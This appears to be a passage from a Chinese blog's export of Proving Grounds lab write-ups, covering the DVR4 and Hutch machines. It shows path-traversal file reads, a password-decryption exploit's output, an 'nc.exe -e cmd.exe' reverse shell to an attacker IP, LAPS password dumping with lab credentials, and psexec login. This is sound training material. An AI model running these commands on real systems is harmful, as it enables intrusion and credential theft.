class="line">pgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS</span><br></pre></td></tr></table></figure>

<p>登录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh viewer@<span class="number">192.168</span>.<span class="number">140.179</span> <span class="literal">-i</span> viewer.id_rsa</span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19044.1645</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\viewer&gt;whoami</span><br><span class="line">dvr4\viewer</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>读配置文件, 没有和用户密码相关的信息</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&quot;</span></span><br><span class="line">[<span class="type">Main</span>]</span><br><span class="line">ServerName=</span><br><span class="line">ServerLocation=</span><br><span class="line">ServerDescription=</span><br><span class="line">ReadH=<span class="number">0</span></span><br><span class="line">UseDialUp=<span class="number">0</span></span><br><span class="line">DialUpConName=</span><br><span class="line">DialUpDisconnectWhenDone=<span class="number">0</span></span><br><span class="line">DIALUPUSEDEFAULTS<span class="string">&quot; checked checked</span></span><br></pre></td></tr></table></figure>

<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><h3 id="SeShutdownPrivilege"><a href="#SeShutdownPrivilege" class="headerlink" title="SeShutdownPrivilege"></a>SeShutdownPrivilege</h3><p>查了下viewer账号下所有文件夹，什么都没有， 在C:下发现了一个output.txt文件，查看内容是以administrator账户执行了 <code>C:\freezeScript\win10.ps1</code>, 运行时间是靶机启动时间</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-112.png.png"></p>
<p>查看脚本的内容，发现C:下 freezeScript文件夹都没有，如果viewer账户可以重启机器，并且有C:写权限的话就可以获得adminstrator权限执行任意代码，查看权限显示有seShutdownPrivilege，写一个把viewer加入administrators group脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State  </span><br><span class="line">============================= ==================================== =======</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled</span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>       Enabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Enabled</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">md</span> freezeScript</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                          </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                          </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">36</span> AM                freezeScript                                                                                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> .\freezeScript\</span><br><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt;  <span class="string">&#x27;Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot;&#x27;</span>| <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\freezeScript\win10.ps1&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; <span class="built_in">cat</span> win10.ps1</span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="string">&quot;viewer&quot;</span></span><br></pre></td></tr></table></figure>

<p>重启时提示无权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">Access is denied.(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>GPT的回答</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">尽管你有 SeShutdownPrivilege 权限，这个错误通常是由于缺少管理员权限导致的。在 PowerShell 或命令提示符中执行 shutdown 命令需要管理员权限，即使你有相关权限，也需要以管理员身份运行 PowerShell。</span><br></pre></td></tr></table></figure>

<h3 id="winpeas"><a href="#winpeas" class="headerlink" title="winpeas"></a>winpeas</h3><p>上传winpeas执行也没有得到有用信息。viewer的权限也比较低，很多内容收集不到。</p>
<h3 id="DRV4配置"><a href="#DRV4配置" class="headerlink" title="DRV4配置"></a>DRV4配置</h3><p>再确认下配置文件， dir发现没有ProgramData文件夹，但是前面已经读到配置文件了，文件夹应该是存在的，<code>dir -froce</code>查看是被隐藏了</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                          </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                          </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">40</span> AM                freezeScript                                                                                  </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">6</span>:<span class="number">08</span> AM                Microsoft                                                                                     </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">14</span> AM                PerfLogs                                                                                      </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Program Files                                                                                 </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">5</span>:<span class="number">55</span> AM                Program Files (x86)                                                                           </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">21</span> AM                Users                                                                                         </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Windows                                                                                       </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">4</span>:<span class="number">52</span> AM           <span class="number">2690</span> output.txt                                                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span> <span class="literal">-force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                          </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                          </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">5</span>:<span class="number">06</span> AM                <span class="variable">$Recycle</span>.Bin                                                                                  </span><br><span class="line">d<span class="literal">--h--</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">5</span>:<span class="number">02</span> AM                <span class="variable">$WinREAgent</span>                                                                                   </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">08</span> AM                Config.Msi                                                                                    </span><br><span class="line">d<span class="literal">--hsl</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">28</span> AM                Documents and Settings                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">40</span> AM                freezeScript                                                                                  </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">6</span>:<span class="number">08</span> AM                Microsoft                                                                                     </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">14</span> AM                PerfLogs                                                                                      </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Program Files                                                                                 </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">5</span>:<span class="number">55</span> AM                Program Files (x86)                                                                           </span><br><span class="line">d<span class="literal">--h--</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">24</span> AM                ProgramData                                                                                   </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">3</span>/<span class="number">11</span>/<span class="number">2022</span>  <span class="number">10</span>:<span class="number">03</span> PM                Recovery                                                                                      </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">3</span>:<span class="number">31</span> AM                System Volume Information                                                                     </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">21</span> AM                Users                                                                                         </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Windows                                                                                       </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM           <span class="number">8192</span> DumpStack.log.tmp                                                                             </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">4</span>:<span class="number">52</span> AM           <span class="number">2690</span> output.txt                                                                                    </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM      <span class="number">671088640</span> pagefile.sys                                                                                  </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM      <span class="number">268435456</span> swapfile.sys                                                                                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> <span class="string">&#x27;.\ProgramData\PY_Software\Argus Surveillance DVR\&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData\PY_Software\Argus Surveillance DVR&gt; <span class="built_in">dir</span> <span class="literal">-force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\ProgramData\PY_Software\Argus Surveillance DVR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                          </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                          </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">26</span> AM                Gallery                                                                                       </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">24</span> AM                Images                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">26</span> AM                Logs                                                                                          </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">28</span> AM             <span class="number">38</span> Argus Surveillance DVR.DVRSes                                                                 </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">45</span> AM           <span class="number">5782</span> DVRParams.ini                                                                                 </span><br></pre></td></tr></table></figure>

<p><code>cat DVRParams.ini</code>看下内容， 这次展示了很多内容，看来是通过cur查看到时候展示行数有限，被截断了。在user部分有administrator的密码密文</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-109.png.png"></p>
<p>回到50130.py破解之</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python <span class="number">50130</span>.py </span><br><span class="line">/home/kali/Tools/pg/DVR4/<span class="number">50130</span>.py:<span class="number">27</span>: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\_&#x27;</span></span><br><span class="line">  banner = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#########################################</span></span><br><span class="line"><span class="string">#    _____ Surveillance DVR 4.0         #</span></span><br><span class="line"><span class="string">#   /  _  \_______  ____  __ __  ______ #</span></span><br><span class="line"><span class="string">#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #</span></span><br><span class="line"><span class="string"># /    |    \  | \/ /_/  &gt;  |  /\___ \  #</span></span><br><span class="line"><span class="string"># \____|__  /__|  \___  /|____//____  &gt; #</span></span><br><span class="line"><span class="string">#         \/     /_____/            \/  #</span></span><br><span class="line"><span class="string">#        Weak Password Encryption       #</span></span><br><span class="line"><span class="string">############ @deathflash1411 ############</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] ECB4:1</span></span><br><span class="line"><span class="string">[+] 53D1:4</span></span><br><span class="line"><span class="string">[+] 6069:W</span></span><br><span class="line"><span class="string">[+] F641:a</span></span><br><span class="line"><span class="string">[+] E03B:t</span></span><br><span class="line"><span class="string">[+] D9BD:c</span></span><br><span class="line"><span class="string">[+] 956B:h</span></span><br><span class="line"><span class="string">[+] FE36:D</span></span><br><span class="line"><span class="string">[+] BD8F:0</span></span><br><span class="line"><span class="string">[+] 3CD9:g</span></span><br><span class="line"><span class="string">[-] D9A8:Unknown</span></span><br></pre></td></tr></table></figure>

<p>最后一个字符没有解出来，看 代码注释，是作者没加特殊字符的编码信息</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-108.png.png"></p>
<p>特殊字符不多，以administrator用户执行反弹shell, 输入密码一个个试下，输入$时，成功获取shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /env /profile /user:DVR4\Administrator &quot;C:\temp\nc.exe -e cmd.exe 192.168.118.14 443</span><br><span class="line">Enter the password for DVR4\Administrator:  </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-nvlp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.140.179</span>] <span class="number">51874</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19044.1645</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\ProgramData\PY_Software\Argus Surveillance DVR&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">dvr4\administrator</span><br></pre></td></tr></table></figure>

<p>官方walkThrough中是在user页面新建了一个user用户，密码设为全部字符<code>!@#$%^&amp;*()</code>在通过配置文件里的密码对比得到密码明文</p>
<p>之前一直以为runas只能在有桌面环境的前提下使用</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-111.png.png"></p>
<h3 id="gsm-codec-dll提权"><a href="#gsm-codec-dll提权" class="headerlink" title="gsm_codec.dll提权"></a><code>gsm_codec.dll</code>提权</h3><p>靶机上没有gcc环境，未测试</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>本文是我在逐步看了hits之后依然没有成功后，看了完成walkThrough后，重头重新打靶的记录，<strong>但是更令我感到挫败和沮丧的是如果重新遇到这个靶机，并且整体思路、步骤正确的情况下我仍然可能拿不下这台靶机，它让我推翻自己之前解决问题的方式</strong></p>
<ol>
<li><p>信息收集阶段</p>
<ol>
<li><p>在看到了arugs surveillance存在的几个漏洞之后，我放弃了继续在web页面上继续收集信息，导致没能找到viewer用户</p>
</li>
<li><p>弱密码破解poc看了之后发现用不到，并没有认真看代码，忽略了其中的配置文件注释，也尝试读取这个文件</p>
</li>
<li><p><strong>更为严重的是：即使在这一步我看到了配置文件路径，并且测试读了配置文件，但是没有有效信息，在后续拿到viewer shell之后，我还是不会想到再去检查一次这个配置文件，因为在我的脑子里是排除法，一直在排查自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担</strong></p>
</li>
</ol>
</li>
<li><p>提权阶段</p>
<ol start="4">
<li><p>在发现seShutdownPrivilege无法提权，并且winpeas没有找到有用信息后，完全没了思路，哪怕再去搜一下DRV4的相关信息呢，过于依赖工具了。</p>
</li>
<li><p><strong>更为严重的是：即使在这一步我成功找到了配置文件，我相信自己仍然不会第一时间想到searchSploit已经发现的exploit, 因为在我的脑海是排查法，一直在排除自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担</strong></p>
</li>
</ol>
</li>
</ol>
<p><strong>信息收集很重要，不要忽略任何信息，不要做减法排查，从最有可能的点着手，而不是像自己以前优先排除后聚焦的解决问题方式</strong></p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Hutch</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<blockquote>
<p><a href="https://medium.com/@Dpsypher/proving-grounds-practice-hutch-f0152efec895">https://medium.com/@Dpsypher/proving-grounds-practice-hutch-f0152efec895</a></p>
</blockquote>
<h1 id="categories"><a href="#categories" class="headerlink" title="categories"></a>categories</h1><p>AD</p>
<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-13.png.png"></p>
<p>是一台ad机器，并且是 Domain Controller</p>
<p>端口：</p>
<ul>
<li>53: DNS over TCP - Simple DNS Plus</li>
<li>80: HTTP Server - WebDav - Microsoft IIS httpd 10.0</li>
<li>88: kerberos service</li>
<li>135 &#x2F; 139 &#x2F; 445: RPC、Netbios、SMB share service</li>
<li>389 &#x2F; 3268 &amp; 636 &#x2F; 3269: LDAP&#x2F;S services</li>
<li>5985 WimRM service</li>
<li>9389: .NET Message Framing service</li>
<li>49xxx: high port RPC services</li>
</ul>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p>尝试从DNS server获取 Zone Transfer, 获取所有子域？ 成功了下一步应该做什么?</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">dig @<span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> AXFR hutch.offsec</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.20</span><span class="number">.2</span><span class="number">-1</span>-Debian &lt;&lt;&gt;&gt; @<span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> AXFR hutch.offsec</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options<span class="punctuation">:</span> +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>

<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">smbclient -L <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> -N</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect<span class="punctuation">:</span> Connection to <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rpcclient <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> -N</span><br><span class="line">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<h2 id="ldapserarch"><a href="#ldapserarch" class="headerlink" title="ldapserarch"></a>ldapserarch</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ldapsearch -H ldap<span class="punctuation">:</span><span class="comment">//192.168.173.122 -x -b &quot;DC=hutch,DC=offsec&quot; |tee ldap_dump</span></span><br></pre></td></tr></table></figure>

<p>收集所有用户名</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">cat ldap_dump |grep -i accountname</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Guest</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Domain Computers</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Cert Publishers</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Domain Users</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Domain Guests</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Group Policy Creator Owners</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> RAS and IAS Servers</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Allowed RODC Password Replication Group</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Denied RODC Password Replication Group</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Enterprise Read-only Domain Controllers</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Cloneable Domain Controllers</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> Protected Users</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> DnsAdmins</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> DnsUpdateProxy</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> rplacidi</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> opatry</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> ltaunton</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> acostello</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> jsparwell</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> oknee</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> jmckendry</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> avictoria</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> jfrarey</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> eaburrow</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> cluddy</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> agitthouse</span><br><span class="line">sAMAccountName<span class="punctuation">:</span> fmcsorley</span><br></pre></td></tr></table></figure>

<p>AS-REP 确认用户是否存在 下载： <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">kerbrute -domain hutch.offsec -users ./users.txt -dc-ip <span class="number">192.168</span><span class="number">.219</span><span class="number">.122</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-14.png.png"></p>
<p>bloodHount 获取dc信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">bloodhound -dns-tcp -ns <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> -d hutch.offsec -u &#x27;fmcsorley&#x27; -p &#x27;CrabSharkJellyfish192&#x27; -c all</span><br></pre></td></tr></table></figure>

<p>将文件全部导入bloodHound</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-15.png.png"></p>
<p>fmcsorley有读LAPSPassword权限，利用ldapsearch获取mc-MCS-AdmPwd</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">-v for verbose</span><br><span class="line">-c to ‘run in continuous mode’ (keep going even if there are errors)</span><br><span class="line">-D is the ‘bind Domain Name’</span><br><span class="line"></span><br><span class="line">ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b <span class="string">&quot;DC=hutch,DC=offsec&quot;</span> -H ldap<span class="punctuation">:</span><span class="comment">//192.168.173.122 &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</span></span><br><span class="line"></span><br><span class="line">ldap_initialize( ldap<span class="punctuation">:</span><span class="comment">//192.168.173.122:389/??base )</span></span><br><span class="line">filter<span class="punctuation">:</span> (ms-MCS-AdmPwd=*)</span><br><span class="line">requesting<span class="punctuation">:</span> ms-MCS-AdmPwd</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;DC=hutch<span class="punctuation">,</span>DC=offsec&gt; with scope subtree</span><br><span class="line"># filter<span class="punctuation">:</span> (ms-MCS-AdmPwd=*)</span><br><span class="line"># requesting<span class="punctuation">:</span> ms-MCS-AdmPwd</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># HUTCHDC<span class="punctuation">,</span> Domain Controllers<span class="punctuation">,</span> hutch.offsec</span><br><span class="line">dn<span class="punctuation">:</span> CN=HUTCHDC<span class="punctuation">,</span>OU=Domain Controllers<span class="punctuation">,</span>DC=hutch<span class="punctuation">,</span>DC=offsec</span><br><span class="line">ms-Mcs-AdmPwd<span class="punctuation">:</span> k+b2qk88c7<span class="punctuation">&#123;</span>F<span class="punctuation">[</span>Z</span><br><span class="line"></span><br><span class="line"># search reference</span><br><span class="line">ref<span class="punctuation">:</span> ldap<span class="punctuation">:</span><span class="comment">//ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec</span></span><br><span class="line"></span><br><span class="line"># search reference</span><br><span class="line">ref<span class="punctuation">:</span> ldap<span class="punctuation">:</span><span class="comment">//DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec</span></span><br><span class="line"></span><br><span class="line"># search reference</span><br><span class="line">ref<span class="punctuation">:</span> ldap<span class="punctuation">:</span><span class="comment">//hutch.offsec/CN=Configuration,DC=hutch,DC=offsec</span></span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search<span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">result<span class="punctuation">:</span> <span class="number">0</span> Success</span><br><span class="line"></span><br><span class="line"># numResponses<span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line"># numEntries<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"># numReferences<span class="punctuation">:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>或者使用 impacket-GetLAPSPassword</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">impacket-GetLAPSPassword HUTCH.offsec/fmcsorley<span class="punctuation">:</span>CrabSharkJellyfish192 -dc-ip <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span></span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Host      LAPS Username  LAPS Password   LAPS Password Expiration  LAPSv2</span><br><span class="line">--------  -------------  --------------  ------------------------  ------</span><br></pre></td></tr></table></figure>

<p>使用impacket-psexec登录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">impacket-psexec <span class="string">&quot;HUTCH/Administrator@192.168.173.122&quot;</span></span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Requesting shares on <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span>.....</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Found writable share ADMIN$</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Uploading file whAChRul.exe</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Opening SVCManager on <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span>.....</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Creating service rdga on <span class="number">192.168</span><span 